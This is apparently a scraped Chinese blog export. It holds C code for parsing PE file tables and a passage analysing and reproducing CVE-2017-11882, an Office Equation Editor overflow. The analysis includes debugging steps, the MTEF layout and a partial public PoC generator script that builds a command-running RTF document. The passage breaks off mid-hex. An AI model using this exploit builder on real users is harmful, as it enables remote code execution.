IMAGE_BASE_RELOCATION;typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; 12345typedef struct _TYPE &#123; WORD Offset : 12; WORD Type : 4; // 4bit &#125;TYPE, *PTYPE; TLS表 1234567891011121314151617typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; // 内存起始地址 DWORD EndAddressOfRawData; // 内存结束地址 DWORD AddressOfIndex; // TLS的索引 DWORD AddressOfCallBacks; // PIMAGE_TLS_CALLBACK *，回调函数的一个数组 DWORD SizeOfZeroFill; // 零填充区域的长度 union &#123; DWORD Characteristics; // 保留字段 struct &#123; DWORD Reserved0 : 20; DWORD Alignment : 4; DWORD Reserved1 : 8; &#125; DUMMYSTRUCTNAME; &#125; DUMMYUNIONNAME;&#125; IMAGE_TLS_DIRECTORY32;typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32; 延迟导入表123456789101112131415161718192021typedef struct _IMAGE_DELAYLOAD_DESCRIPTOR &#123; union &#123; DWORD AllAttributes; struct &#123; DWORD RvaBased : 1; // Delay load version 2 DWORD ReservedAttributes : 31; &#125; DUMMYSTRUCTNAME; &#125; Attributes; // 属性 DWORD DllNameRVA; // 动态链接库名称的RVA DWORD ModuleHandleRVA; // 模块句柄的RVA DWORD ImportAddressTableRVA; // IAT的RVA DWORD ImportNameTableRVA; // INT的RVA DWORD BoundImportAddressTableRVA; // RVA to an optional bound IAT DWORD UnloadInformationTableRVA; // RVA to an optional unload info table DWORD TimeDateStamp; // 0 if not bound, // Otherwise, date/time of the target DLL&#125; IMAGE_DELAYLOAD_DESCRIPTOR, *PIMAGE_DELAYLOAD_DESCRIPTOR;typedef const IMAGE_DELAYLOAD_DESCRIPTOR *PCIMAGE_DELAYLOAD_DESCRIPTOR; 资源表123456789typedef struct _IMAGE_RESOURCE_DIRECTORY &#123; DWORD Characteristics; // 00000000 DWORD TimeDateStamp; // 资源创建时间 WORD MajorVersion; // 4 WORD MinorVersion; // 0 WORD NumberOfNamedEntries; // 以字符串作为资源标识的条目的个数 WORD NumberOfIdEntries; // 以数字作为资源标识的条目的个数// IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY; 1234567891011121314151617typedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY &#123; union &#123; struct &#123; DWORD NameOffset:31; // 资源表的偏移 DWORD NameIsString:1; // 资源为字符串，值为1表示资源为字符串-&gt;开发者的资源，不为1表示是系统资源 &#125; DUMMYSTRUCTNAME; DWORD Name; // 资源的类型即资源名 WORD Id; // 资源的数字ID &#125; DUMMYUNIONNAME; union &#123; DWORD OffsetToData; // 数据偏移的地址 struct &#123; DWORD OffsetToDirectory:31; // 子目录偏移的地址 DWORD DataIsDirectory:1; // 数据是目录，值为1表示数据是目录 &#125; DUMMYSTRUCTNAME2; &#125; DUMMYUNIONNAME2;&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; 1234typedef struct _IMAGE_RESOURCE_DIR_STRING_U &#123; WORD Length; // 字符串长度 WCHAR NameString[ 1 ]; // 字符串数组&#125; IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U; 123456typedef struct _IMAGE_RESOURCE_DATA_ENTRY &#123; DWORD OffsetToData; // 资源数据的RVA DWORD Size; // 资源数据的长度 DWORD CodePage; // 代码页 DWORD Reserved; // 保留字段&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY; 12345678910// 资源总数 = NumberOfNamedEntries + NumberOfIdEntriestypedef struct _IMAGE_RESOURCE_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; WORD NumberOfNamedEntries; WORD NumberOfIdEntries;// IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY; PE文件解析代码头文件12345678910111213141516171819#pragma once#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;// 计算数据目录表起始位置到文件头(MZ)的偏移DWORD RvaToOffset(DWORD dwRva, char *buffer);// 解析导入表的函数void ImportTbale(char *buffer);// 解析导出表的函数void ExportTable(char *buffer);// 解析重定位表的函数void RelocTable(char *buffer);// 解析TLS的函数void TLSTable(char *buffer);// 解析延迟导入表的函数void DelayImport(char *buffer); 主函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313#include &quot;Entry.h&quot;int main()&#123; FILE *pFile = NULL; errno_t err; char *buffer; int nFileLength = 0; err = fopen_s(&amp;pFile, &quot;D:\\\\desktop\\\\PEiD.exe&quot;, &quot;rb&quot;); // 二进制形式读取PE文件,注意反斜杠前面需要再加一个反斜杠进行转义 fseek(pFile, 0, SEEK_END); nFileLength = ftell(pFile); rewind(pFile); int imageLength = nFileLength * sizeof(char) + 1; buffer = (char *)malloc(imageLength); memset(buffer, 0, nFileLength * sizeof(char) + 1); fread(buffer, 1, imageLength, pFile); // DOS头解析 PIMAGE_DOS_HEADER Read_Dos_Header; Read_Dos_Header = (PIMAGE_DOS_HEADER)buffer; printf(&quot;--- MS DOS HEADER ---\\n&quot;); printf(&quot;DOS标志位：%x\\n&quot;, Read_Dos_Header-&gt;e_magic); printf(&quot;PE头偏移：%x\\n\\n&quot;, Read_Dos_Header-&gt;e_lfanew); // PE头解析 printf(&quot;--- PE HEADER ---\\n&quot;); PIMAGE_NT_HEADERS Read_NT_Headers; // PE头，包含标准PT头和扩展PE头 Read_NT_Headers = (PIMAGE_NT_HEADERS)(buffer + Read_Dos_Header-&gt;e_lfanew); printf(&quot;PE标志位：%x\\n&quot;, Read_NT_Headers-&gt;Signature); printf(&quot;运行平台：%x\\n&quot;, Read_NT_Headers-&gt;FileHeader.Machine); // FileHeader: 标准头 printf(&quot;程序入口点：%x\\n\\n&quot;, Read_NT_Headers-&gt;OptionalHeader.ImageBase); // OptionalHeader：扩展头 // 区段解析遍历, 根据标准PE头中的NumberOfSections进行遍历 PIMAGE_SECTION_HEADER Read_Section_Header = IMAGE_FIRST_SECTION(Read_NT_Headers); printf(&quot;--- Section HEADER ---\\n&quot;); PIMAGE_FILE_HEADER PFileHeder = &amp;(Read_NT_Headers-&gt;FileHeader); for (int i = 0; i &lt; PFileHeder-&gt;NumberOfSections; ++i) &#123; printf(&quot;Name(区段名)：%s\\n&quot;, Read_Section_Header[i].Name); printf(&quot;VOffset(起始的相对虚拟地址)：%08X\\n&quot;, Read_Section_Header[i].VirtualAddress); printf(&quot;VSize(内存区段大小)：%08X\\n&quot;, Read_Section_Header[i].SizeOfRawData); printf(&quot;ROffset(文件偏移)：%08X\\n&quot;, Read_Section_Header[i].PointerToRawData); printf(&quot;RSize(文件区段大小)：%08X\\n&quot;, Read_Section_Header[i].Misc.VirtualSize); printf(&quot;标记(区段属性)：%08X\\n\\n&quot;, Read_Section_Header[i].Characteristics); &#125; printf(&quot;---导入表信息---\\n&quot;); ImportTbale(buffer); printf(&quot;---导入表信息---\\n&quot;); ExportTable(buffer); /*printf(&quot;---重定位表信息---\\n&quot;); RelocTable(buffer);*/ printf(&quot;---TLS表信息---\\n&quot;); TLSTable(buffer); printf(&quot;---延迟导入表表信息---\\n&quot;); DelayImport(buffer); free(buffer); return 0;&#125;// 地址转换函数// dwRva是某个数据目录表项的VirutualAddress// buffer是读取到的PE文件缓冲区DWORD RvaToOffset(DWORD dwRva, char *buffer)&#123; // DOS头 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer; // PE头 PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew); // 区段表 PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNT); // 判断是否落在头部中 if (dwRva &lt; pSection[0].VirtualAddress) &#123; return dwRva; &#125; for (int i = 0; i &lt; pNT-&gt;FileHeader.NumberOfSections; ++i) &#123; // VirtualAddress：起始地址 // Size：长度 // VirtualAddress+Size：结束地址 // 判断是否落在某个区段内 if (dwRva &gt;= pSection[i].VirtualAddress &amp;&amp; dwRva &lt;= pSection[i].VirtualAddress + pSection[i].Misc.VirtualSize) &#123; // dwRva - pSection[i].VirtualAddress对应数据目录表起始地址到区段起始地址的偏移Offset // pSection[i].PointerToRawData: 区段到文件头的偏移Offset // 返回数据目录表起始地址到文件头的偏移Offset return dwRva - pSection[i].VirtualAddress + pSection[i].PointerToRawData; &#125; &#125; return 0;&#125;void ImportTbale(char *buffer)&#123; // DOS头 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer; // PE头 PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew); // 定位导入表 PIMAGE_DATA_DIRECTORY pImoprtDir = (PIMAGE_DATA_DIRECTORY)(pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT); // 填充结构 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(RvaToOffset(pImoprtDir-&gt;VirtualAddress, buffer) + buffer); while (pImport-&gt;Name != NULL) &#123; char *szDllName = (char *)(RvaToOffset(pImport-&gt;Name, buffer) + buffer); printf(&quot;DLL名称: %s\\n&quot;, szDllName); printf(&quot;日期时间标志: %08x\\n&quot;, pImport-&gt;TimeDateStamp); printf(&quot;ForwarderChain: %08x\\n&quot;, pImport-&gt;ForwarderChain); printf(&quot;名称OFFSET: %08x\\n&quot;, pImport-&gt;Name); printf(&quot;FirstThunk: %08x\\n&quot;, pImport-&gt;FirstThunk); printf(&quot;OriginalFirstThunk: %08x\\n\\n&quot;, pImport-&gt;OriginalFirstThunk); // 指向导入地址表的RVA PIMAGE_THUNK_DATA pIat = (PIMAGE_THUNK_DATA)(RvaToOffset(pImport-&gt;OriginalFirstThunk, buffer) + buffer); DWORD index = 0; DWORD ImportOffset = 0; // 被导入函数的序号 while (pIat-&gt;u1.Ordinal != 0) &#123; printf(&quot;ThunkRva: %08x\\n&quot;, pImport-&gt;OriginalFirstThunk + index); ImportOffset = RvaToOffset(pImport-&gt;OriginalFirstThunk, buffer); printf(&quot;ThunkOffset: %08x\\n&quot;, ImportOffset + index); index += 4; if ((pIat-&gt;u1.Ordinal &amp; 0x80000000) != 1) &#123; PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(RvaToOffset(pIat-&gt;u1.AddressOfData, buffer) + buffer); printf(&quot;API名称：%s\\n&quot;, pName-&gt;Name); printf(&quot;Hint(API序号)：%04x\\n&quot;, pName-&gt;Hint); printf(&quot;ThunkValue：%08x\\n\\n&quot;, pIat-&gt;u1.Function); // 被导入函数的地址 &#125; pIat++; &#125; pImport++; &#125;&#125;void ExportTable(char *buffer)&#123; // DOS头 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer; // PE头 PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew); // 定位数据目录表中的导出表 PIMAGE_DATA_DIRECTORY pExportDir = pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT; // 填充导出表结构 PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(RvaToOffset(pExportDir-&gt;VirtualAddress, buffer) + buffer); char *szName = (char *)(RvaToOffset(pExport-&gt;Name, buffer) + buffer); if (pExport-&gt;AddressOfFunctions == 0) &#123; printf(&quot;当前没有导出表!\\n\\n&quot;); return; &#125; printf(&quot;导出表OFFSET：%08x\\n&quot;, RvaToOffset(pExportDir-&gt;VirtualAddress, buffer)); printf(&quot;特征值：%08x\\n&quot;, pExport-&gt;Characteristics); printf(&quot;基数：%08x\\n&quot;, pExport-&gt;Base); printf(&quot;名称OFFSET：%08x\\n&quot;, pExport-&gt;Name); printf(&quot;名称：%s\\n&quot;, szName); printf(&quot;函数数量：%08x\\n&quot;, pExport-&gt;NumberOfFunctions); printf(&quot;函数名数量：%08x\\n&quot;, pExport-&gt;NumberOfNames); printf(&quot;函数地址：%08x\\n&quot;, pExport-&gt;AddressOfFunctions); printf(&quot;函数名地址：%08x\\n&quot;, pExport-&gt;AddressOfNames); printf(&quot;函数名称序号地址：%08x\\n&quot;, pExport-&gt;AddressOfNameOrdinals); // 函数数量 DWORD dwNumOfFun = pExport-&gt;NumberOfFunctions; // 函数名数量 DWORD dwNumOfNames = pExport-&gt;AddressOfNames; // 基数 DWORD dwBase = pExport-&gt;Base; // 导出地址表 PDWORD pEat32 = (PDWORD)(RvaToOffset(pExport-&gt;AddressOfFunctions, buffer) + buffer); // 导出名称表 PDWORD pEnt32 = (PDWORD)(RvaToOffset(pExport-&gt;AddressOfNames, buffer) + buffer); // 导出序号表 PWORD pId = (PWORD)(RvaToOffset(pExport-&gt;AddressOfNameOrdinals, buffer) + buffer); for (int i = 0; i &lt; dwNumOfFun; ++i) &#123; if (pEat32[i] == 0) &#123; continue; &#125; DWORD Id = 0; for (; Id &lt; dwNumOfNames; ++Id) &#123; if (pId[Id] == i) &#123; break; &#125; &#125; if (Id == dwNumOfNames) &#123; printf(&quot;Id: %x Address: 0x%08x Name[NULL]\\n&quot;, i + dwBase, pEat32[i]); &#125; else &#123; char *szFunName = (char *)(RvaToOffset(pEnt32[Id], buffer) + buffer); printf(&quot;Id: %x Address: 0x%08x Name[%s]\\n&quot;, i + dwBase, pEat32[i], szFunName); &#125; &#125;&#125;void RelocTable(char *buffer)&#123; typedef struct _TYPE &#123; WORD Offset : 12; WORD Type : 4; // 4bit &#125;TYPE, *PTYPE; // DOS头 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer; // PE头 PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew); // 定位重定位表 PIMAGE_DATA_DIRECTORY pRelocDir = (pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC); // 填充重定位表的结构 PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(RvaToOffset(pRelocDir-&gt;VirtualAddress, buffer) + buffer); // 定位区段 PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNT); while (pReloc-&gt;SizeOfBlock != 0) &#123; // 找到本0x1000字节的起始位置 DWORD dwCount = (pReloc-&gt;SizeOfBlock - 8) / 2; // 需要重定位的个数 DWORD dwRva = (pReloc-&gt;VirtualAddress); PTYPE pRelocArr = (PTYPE)(pReloc + 1); printf(&quot;区段: %s\\n&quot;, pSection-&gt;Name); printf(&quot;RVA: %08x\\n&quot;, dwRva); printf(&quot;项目: %X H / %d\\n&quot;, pReloc-&gt;SizeOfBlock, pReloc-&gt;SizeOfBlock); // 进制不同 // 找到下一个0x1000字节的结构体 pReloc = (PIMAGE_BASE_RELOCATION)((char *)pReloc + pReloc-&gt;SizeOfBlock); for (int i = 0; i &lt; dwCount; ++i) &#123; PDWORD pData = (PDWORD)(RvaToOffset(pRelocArr[i].Offset + dwRva, buffer) + buffer); DWORD pDataOffset = RvaToOffset(pRelocArr[i].Offset + dwRva, buffer); printf(&quot;RVA: %08x\\n&quot;, pRelocArr[i].Offset + dwRva); printf(&quot;区段: %08x\\n&quot;, *pData); printf(&quot;偏移: %08x\\n\\n&quot;, pDataOffset); &#125; &#125;&#125;void TLSTable(char *buffer)&#123; // DOS头 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer; // PE头 PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew); // 定位数据目录表中的TLS表 PIMAGE_DATA_DIRECTORY pTLSDir = (pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_TLS); // 填充TLS结构 PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(RvaToOffset(pTLSDir-&gt;VirtualAddress, buffer) + buffer); printf(&quot;数据块开始VA：%08x\\n&quot;, pTLS-&gt;StartAddressOfRawData); printf(&quot;数据块结束VA：%08x\\n&quot;, pTLS-&gt;EndAddressOfRawData); printf(&quot;索引变量VA：%08x\\n&quot;, pTLS-&gt;AddressOfIndex); printf(&quot;回调表VA：%08x\\n&quot;, pTLS-&gt;AddressOfCallBacks); printf(&quot;填0大小：%08x\\n&quot;, pTLS-&gt;SizeOfZeroFill); printf(&quot;特征值：%08x\\n\\n&quot;, pTLS-&gt;Characteristics);&#125;void DelayImport(char *buffer)&#123; // DOS头 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer; // PE头 PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew); // 定位数据目录表中的延迟导入表 PIMAGE_DATA_DIRECTORY pDelayLoadDir = (pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT); // 填充延迟导入表的数据结构 PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad = (PIMAGE_DELAYLOAD_DESCRIPTOR)(RvaToOffset(pDelayLoadDir-&gt;VirtualAddress, buffer) + buffer); while (pDelayLoad-&gt;DllNameRVA != NULL) &#123; char *szDllName = (char *)(RvaToOffset(pDelayLoad-&gt;DllNameRVA, buffer) + buffer); printf(&quot;DllName: %s\\n&quot;, szDllName); printf(&quot;Attributes: %08X\\n&quot;, pDelayLoad-&gt;Attributes); printf(&quot;ModuleHandleRVA: %08X\\n&quot;, pDelayLoad-&gt;ModuleHandleRVA); printf(&quot;ImportAddressTableRVA: %08X\\n&quot;, pDelayLoad-&gt;ImportAddressTableRVA); printf(&quot;ImportNameTableRVA: %08X\\n&quot;, pDelayLoad-&gt;ImportNameTableRVA); printf(&quot;BoundImportAddressTableRVA: %08X\\n&quot;, pDelayLoad-&gt;BoundImportAddressTableRVA); printf(&quot;UnloadInformationTableRVA: %08X\\n&quot;, pDelayLoad-&gt;UnloadInformationTableRVA); printf(&quot;TimeDateStamp: %08X\\n\\n&quot;, pDelayLoad-&gt;TimeDateStamp); pDelayLoad++; &#125;&#125;","tags":"pe结构"},{"title":"CVE-2017-11882原理、复现和Poc解析利用","url":"/post/87db0641.html","text":"影响版本 Office 365 Microsoft Office 2000 Microsoft Office 2003 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 Microsoft Office 2013 Service Pack 1 Microsoft Office 2016 漏洞原理分析：参考文章：CVE-2017-11882 漏洞分析总结 注：没给链接的工具可以网上搜搜，很多的 定位漏洞程序 打开能弹出计算器的poc文档： 使用processhacker分析进程状态，发现calc由cmd打开，但是cmd却没有父进程，这不正常，至少有一个程序负责拉起cmd 使用pchunter查找父进程得到其PID但是找不到具体是什么 重新打开poc文档，pchunter得到PID + process monitor的树形控件定位到cmd父进程为EQNEDT32.exe 注册表新建ENQEDT32.EXE并设置x32dbg为即时调试器(详细方法看文末的解决方案) 由于poc代码可以弹出计算器，猜测漏洞函数为WinExec或者CreateProcess之类的API 调试漏洞程序打开poc文档，弹出x32dbg，ctrl + G定位WinExec位置并下断点 运行到断点，查看堆栈，找到函数的返回值00430C18，去看看 上图是调用WinExec的地方，我们再看看是哪里转到这里来的，直接查看堆栈即可，找比刚刚地址更高的返回位置 注：栈由高地址向低地址增长，所以前一个函数的返回地址应该在高地址 去看看004218E4： 可以看到，调用的函数是4115A7，使用IDA静态分析这个函数(直接按g输入地址)，F5反汇编： strlen、strcmp都不可能导致栈溢出，所以推测应该是sub_41160F有问题，去看看： 通读，发现第18行strcpy没有使用安全函数并且没有对a1的长度进行校验，对比汇编窗口的rep movsd语句： 12345678# 注意！32位不同于8086，不需要段寄存器，edi、esi直接就定位内存中的地址rep movsb # 重复ecx次，每次将一个字节从esi到 edirep movsw # 重复ecx次，每次将一个字从esi到 edirep movsd # 重复ecx次，每次将两个字从esi到 edi# 执行完上述操作以后会对esi和edi进行修改：# DF = 0：esi和edi递增# DF = 1：esi和edi递减 123456repne scasb# 作用：查看目标字符串是否含有某个字符# rep就是repeate重复，ne就是not equal不相等；所以该指令的意思就是ecx != 0(即循环未结束)并且后面的两个值不相等(即ZF != 0)# scasb就是比较[edi]和al是否相等，会改变ZF的值；此外，还会依照如下规则修改edi的值：# DF = 0：inc edi# DF = 1：dec edi 回到x32dbg动态分析sub_41160F，给函数入口点和溢出点下断点，同时要对Win32Exec和之前提到的4115A7下断点: 进入函数，重点关注函数的返回地址是否被覆盖，这里我使用了监视进行查看： 注：函数的返回地址就是进入这个函数之后push ebp还未执行时ESP所指向的地址的数据 第一次运行过后发现函数返回值并没有被覆盖： 再次执行该函数，同样重点关注函数返回地址： 可以看到，第二次执行该函数时，函数的返回地址被修改： 可以看到返回值变成了0043C12，我们去看看这个地址，发现是WinExec函数的地址，之后由WinExec调用计算器程序： 使用Pestudio查看ENQEDT32.EXE的ALSR与DEP发现两个保护措施都是关闭的 分析poc代码的利用：定位到溢出点，双击&amp;12查看内存数据 下图中，r是返回值，arg_0、arg_4、arg_8是参数，上下两图可以看出缓冲区大小为28h - 5 + 1 = 24h 下图是第二次运行到溢出点之后的截图，根据rep movsd我们知道注入的数据为ecx * 4B即30h的内容(注：ecx = 12)，根据EDI定位到内存数据，查看得到其注入的内容为cmd.exe /c calc.exe 另外，注意看最后4个字节数据(一组十六进制数就是一个字节，例如：6D，这就是一组即两个十六进制数，就是一个字节)：倒过来看是 00 43 0c 12，这就是WinExec的函数地址 理解RTF文档格式和Equation Native数据流参考文章： 【漏洞分析】CVE-2017-11882漏洞分析、利用及动态检测 Office系列漏洞之CVE-2017-11882 Equation Native数据流 Equation Native数据流 = EQNOLEFILEHDR + MTEFData MTEFData = MTEFheader + MTEF Byte Stream EQNOLEFILEHDR固定为28字节： 12345678910111213141516171819struct EQNOLEFILEHDR &#123; WORD cbHdr; // 格式头长度，固定为0x1C。 DWORD version; // 固定为0x00020000。 WORD cf; // 该公式对象的剪贴板格式。 DWORD cbObject; // MTEF数据的长度，包括MTEF头部。 DWORD reserved1; // 未公开 DWORD reserved2; // 未公开 DWORD reserved3; // 未公开 DWORD reserved4; // 未公开&#125;; MTEFheader固定为5字节： byte description value 0 MTEF version 3 1 generating platform 0 for Macintosh, 1 for Windows 2 generating product 0 for MathType, 1 for Equation Editor 3 product version 3 4 product subversion 0A MTEFByte Streaminitial SIZE开头，固定为0A value symbol description 0 END end of MTEF, pile, line, embellishment list, or template 1 LINE line (slot) record 2 CHAR character record 3 TMPL template record 4 PILE pile (vertical stack of lines) record 5 MATRIX matrix record 6 EMBELL character embellishment (e.g. hat, prime) record 7 RULER ruler (tab-stop location) record 8 FONT font name record 9 SIZE general size record 10 FULL full size record 11 SUB subscript size record 12 SUB2 sub-subscript size record 13 SYM symbol size record 14 SUBSYM sub-symbol size record 重点注意FONT record，即value=0x08： Font record = tag(固定为8，占一个字节) + typeface(占一个字节) + style(占一个字节) + font_name(以0x00结尾的字符串) typeface和style这两个字节的值不影响漏洞的触发 RTF文档格式(了解)： 其中，objupdate控制字来保证OLE(Object Linking and Embedding：对象链接与嵌入)对象的自动更新和加载，从而触发漏洞代码执行。默认状态下Office文档中的OLE Object需要用户双击才能生效。将OLE Object的属性为自动更新，这样无需交互，点击打开文档后OLE Object对象会生效，从而执行恶意代码。 使用Oletools分析OLE对象Oletools包含一系列工具，包括rtfobj.py和olebrowse.py等 12# 使用rtfobj查看文档得到流文件信息同时会自动生成bin文件python rtfobj.py -s all C:\\Users\\DELL\\Desktop\\1.rtf // 缺少的依赖直接pip install 1python oledir.py C:\\Users\\DELL\\Desktop\\note.doc_object_000000FE.bin 12# 使用olebrowse查看Equation Native的具体信息python olebrowse.py C:\\Users\\DELL\\Desktop\\note.doc_object_000000FE.bin 通过上面这幅图分析Equation Native数据流： 开头的1C是cbHdr; // 格式头长度 地址0000 0008开始的四个字节是 00 00 00 A9，即MTEF结构的长度 地址0000 001C开始，前五个字节是MTEF Header 然后是0A对应initial Size，之后有一个08，对应FONT的tag：Font record = tag(固定为8，占一个字节) + typeface(占一个字节) + style(占一个字节) + font_name(以0x00结尾的字符串)，font_name中包含了攻击代码 &quot;cmd.exe /c calc.exe&quot; poc代码解析：看着很多很复杂，其实只要理解关键的地方就好，其余的不用过多关注 argsparse是python的命令行解析的标准模块，内置于python，不需要安装。这个库可以让我们直接在命令行中就可以向程序中传入参数并让程序运行。使用方法如下： 12345678910# 创建解析对象import argparseparser = argparse.ArgumentParser()# 添加参数，有很多可选参数# parser.add_argument([], action=[], nargs=[], const=[], default=[], type=[], choices=[], required=[], help=[], metavar=[], dest=[])parser.add_argument(&#x27;square&#x27;, type=int, help=&quot;display a square of a given number&quot;)# 解析参数args = parser.parse_args()# 使用参数print(args.square ** 2) 代码中的head(默认的rtf文件头)、objclass(公式对象)、tail(rtf文件尾部)、stage1(作者编写的shellcode的机器码)、payload(Equation Native数据流的EQNOLEFILEHDR + MTEF头部和initial Size与Font的tag)都是固定格式； 代码运行流程： 1python2 Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o cal.doc 创建解析对象并根据输入的命令解析参数 制作rft文件的头部，如果你传入了rtf文件，就用该rtf文件的头部信息；如果没有传就使用head作为rtf文件头部信息 制作Equation Native数据流：把使用者输入的-c参数嵌入到Equation Native数据流的FontName当中，对应代码第57行 代码第58行：197(10进制) = A9(16进制) + 28(10进制) // A9对应EQNOLEFILEHDR的cbObject值，即MTEF的长度；28是EQNOLEFILEHDR的固有长度 将制作好的文件保存到-o参数指定的文件中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889# Original poc :https://github.com/embedi/CVE-2017-11882# This version accepts a command with 109 bytes long in maximum.# Sorry I don&#x27;t know how to read the struct in objdata, hence I cannot modify the length parameter to aquire a arbitrary length code execution.# But that&#x27;s enough in exploitation. We can use regsvr32 to load sct file remotely.:)import argparseimport sysfrom struct import pack# rtf文件固有格式head=r&#x27;&#x27;&#x27;&#123;\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033&#123;\\fonttbl&#123;\\f0\\fnil\\fcharset0 Calibri;&#125;&#125;&#123;\\*\\generator Riched20 6.3.9600&#125;\\viewkind4\\uc1\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9&#x27;&#x27;&#x27;objclass=r&#x27;&#x27;&#x27;&#123;\\object\\objemb\\objupdate&#123;\\*\\objclass Equation.3&#125;\\objw380\\objh260&#123;\\*\\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006